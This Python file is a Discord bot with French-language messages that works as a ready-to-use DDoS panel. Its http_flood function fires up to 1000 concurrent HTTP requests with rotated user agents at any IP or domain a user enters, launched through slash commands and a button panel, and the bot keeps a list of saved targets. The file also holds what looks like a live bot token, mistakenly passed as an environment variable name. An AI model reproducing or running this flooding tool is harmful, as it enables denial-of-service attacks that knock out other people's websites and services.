import discord
from discord.ext import commands
import asyncio
import aiohttp
import random
import time
import json
import os

TOKEN = os.environ.get("MTUxMDI1MzY5MzgxODI0MTEyNQ.G2Qk3z.fi-s5O52aJL_EDEPzDNIHBtRa-CqYmttEuysGA")

OWNER_IDS = [
    1502311180587499560,
    1502311180587499560
]

ADMIN_IDS = []

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="/", intents=intents, help_command=None)

attack_running = False
CONFIG_FILE = "ddos_config.json"

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {"targets": []}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def is_owner(interaction):
    return interaction.user.id in OWNER_IDS

def is_admin(interaction):
    return interaction.user.id in OWNER_IDS or interaction.user.id in ADMIN_IDS

async def http_flood(target, duration, threads=100):
    global attack_running
    attack_running = True
    end_time = time.time() + duration

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36"
    ]

    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"

    async def send_request(session):
        while attack_running and time.time() < end_time:
            try:
                headers = {"User-Agent": random.choice(user_agents)}
                async with session.get(target, headers=headers, timeout=2) as resp:
                    pass
                await asyncio.sleep(0.01)
            except:
                pass

    connector = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(send_request(session)) for _ in range(threads)]
        await asyncio.gather(*tasks, return_exceptions=True)

@bot.event
async def on_ready():
    print(f"{bot.user} est prêt !")
    print(f"Owners : {OWNER_IDS}")
    print(f"Admins : {ADMIN_IDS}")
    try:
        synced = await bot.tree.sync()
        print(f"Commandes synchronisées : {len(synced)}")
    except Exception as e:
        print(f"Erreur : {e}")

@bot.tree.command(name="addadmin", description="[OWNER] Ajoute un admin")
async def addadmin(interaction: discord.Interaction, user_id: str):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ Seul un owner peut ajouter des admins.", ephemeral=True)
        return
    try:
        new_admin_id = int(user_id)
    except:
        await interaction.response.send_message("❌ ID invalide.", ephemeral=True)
        return
    if new_admin_id in ADMIN_IDS:
        await interaction.response.send_message(f"❌ <@{new_admin_id}> est déjà admin.", ephemeral=True)
        return
    if new_admin_id in OWNER_IDS:
        await interaction.response.send_message(f"❌ <@{new_admin_id}> est déjà owner.", ephemeral=True)
        return
    ADMIN_IDS.append(new_admin_id)
    await interaction.response.send_message(f"✅ <@{new_admin_id}> peut maintenant utiliser les commandes admin.", ephemeral=True)

@bot.tree.command(name="removeadmin", description="[OWNER] Retire un admin")
async def removeadmin(interaction: discord.Interaction, user_id: str):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ Seul un owner peut retirer des admins.", ephemeral=True)
        return
    try:
        rem_admin_id = int(user_id)
    except:
        await interaction.response.send_message("❌ ID invalide.", ephemeral=True)
        return
    if rem_admin_id not in ADMIN_IDS:
        await interaction.response.send_message(f"❌ <@{rem_admin_id}> n'est pas admin.", ephemeral=True)
        return
    ADMIN_IDS.remove(rem_admin_id)
    await interaction.response.send_message(f"✅ <@{rem_admin_id}> n'est plus admin.", ephemeral=True)

@bot.tree.command(name="listadmins", description="[OWNER] Liste les admins")
async def listadmins(interaction: discord.Interaction):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ Seul un owner peut voir cette liste.", ephemeral=True)
        return
    msg = "**👑 OWNERS**\n"
    for o in OWNER_IDS:
        msg += f"• <@{o}>\n"
    msg += "\n**👥 ADMINS**\n"
    if ADMIN_IDS:
        for a in ADMIN_IDS:
            msg += f"• <@{a}>\n"
    else:
        msg += "• Aucun\n"
    await interaction.response.send_message(msg, ephemeral=True)

@bot.tree.command(name="panel", description="Déploie le panel DDoS")
async def panel(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ Seuls les admins peuvent déployer ce panel.", ephemeral=True)
        return

    config = load_config()
    embed = discord.Embed(
        title="💀 FREE LOOKUP - PANEL DDoS 💀",
        description="Panel DDoS - Max 1000 threads",
        color=0xff0000
    )
    embed.add_field(name="👑 Owners", value="\n".join([f"<@{o}>" for o in OWNER_IDS]), inline=False)
    embed.add_field(name="🎯 Cibles", value=str(len(config["targets"])), inline=True)
    embed.add_field(name="⚙️ Statut", value="🔴 STOP" if not attack_running else "🟢 ATTACK", inline=True)

    class PanelButtons(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=None)

        @discord.ui.button(label="💀 LANCER ATTAQUE", style=discord.ButtonStyle.danger)
        async def attack_btn(self, btn_interaction: discord.Interaction, button: discord.ui.Button):
            await btn_interaction.response.send_modal(DDOSModal())

        @discord.ui.button(label="🛑 STOP ATTAQUE", style=discord.ButtonStyle.secondary)
        async def stop_btn(self, btn_interaction: discord.Interaction, button: discord.ui.Button):
            global attack_running
            attack_running = False
            await btn_interaction.response.send_message("🛑 Attaque arrêtée", ephemeral=True)

    await interaction.response.send_message(embed=embed, view=PanelButtons())

class DDOSModal(discord.ui.Modal, title="💀 ATTAQUE DDoS"):
    cible = discord.ui.TextInput(label="Cible (IP ou domaine)", placeholder="ex: 192.168.1.1")
    duree = discord.ui.TextInput(label="Durée (secondes)", placeholder="60", default="60")
    threads = discord.ui.TextInput(label="Threads (max 1000)", placeholder="500", default="500")

    async def on_submit(self, interaction: discord.Interaction):
        global attack_running
        await interaction.response.defer(ephemeral=True)
        if attack_running:
            await interaction.followup.send("❌ Une attaque est déjà en cours. Utilise STOP.", ephemeral=True)
            return
        target = self.cible.value
        try:
            duration = int(self.duree.value)
            threads = int(self.threads.value)
        except:
            await interaction.followup.send("❌ Durée et threads doivent être des nombres.", ephemeral=True)
            return
        
        threads = min(threads, 1000)
        duration = min(duration, 300)
        
        await interaction.followup.send(f"💀 ATTAQUE LANCÉE\n🎯 Cible: {target}\n⏱️ Durée: {duration}s\n⚙️ Threads: {threads}", ephemeral=True)
        
        try:
            await http_flood(target, duration, threads)
            await interaction.followup.send(f"✅ Attaque terminée sur {target}", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Erreur : {e}", ephemeral=True)
        finally:
            attack_running = False

@bot.tree.command(name="ddos", description="Lance une attaque DDoS")
async def ddos(interaction: discord.Interaction, target: str, duration: int = 60, threads: int = 500):
    global attack_running
    await interaction.response.defer(ephemeral=True)
    if attack_running:
        await interaction.followup.send("❌ Attaque déjà en cours. Utilise /stopddos", ephemeral=True)
        return
    
    threads = min(threads, 1000)
    duration = min(duration, 300)
    
    await interaction.followup.send(f"💀 Attaque lancée sur {target} - {duration}s - {threads} threads", ephemeral=True)
    
    try:
        await http_flood(target, duration, threads)
        await interaction.followup.send(f"✅ Attaque terminée sur {target}", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Erreur : {e}", ephemeral=True)
    finally:
        attack_running = False

@bot.tree.command(name="stopddos", description="Arrête l'attaque")
async def stopddos(interaction: discord.Interaction):
    global attack_running
    attack_running = False
    await interaction.response.send_message("🛑 Attaque arrêtée", ephemeral=True)

@bot.tree.command(name="addtarget", description="[ADMIN] Ajoute une cible")
async def addtarget(interaction: discord.Interaction, ip: str, nom: str = None):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ Commande réservée aux admins.", ephemeral=True)
        return
    config = load_config()
    config["targets"].append({"ip": ip, "name": nom if nom else ip})
    save_config(config)
    await interaction.response.send_message(f"✅ Cible {nom or ip} ajoutée", ephemeral=True)

@bot.tree.command(name="targetlist", description="[ADMIN] Liste les cibles")
async def targetlist(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ Commande réservée aux admins.", ephemeral=True)
        return
    config = load_config()
    if not config["targets"]:
        await interaction.response.send_message("Aucune cible", ephemeral=True)
        return
    msg = "**🎯 LISTE DES CIBLES**\n"
    for i, t in enumerate(config["targets"], 1):
        msg += f"{i}. {t['name']} - {t['ip']}\n"
    await interaction.response.send_message(msg, ephemeral=True)

bot.run(TOKEN)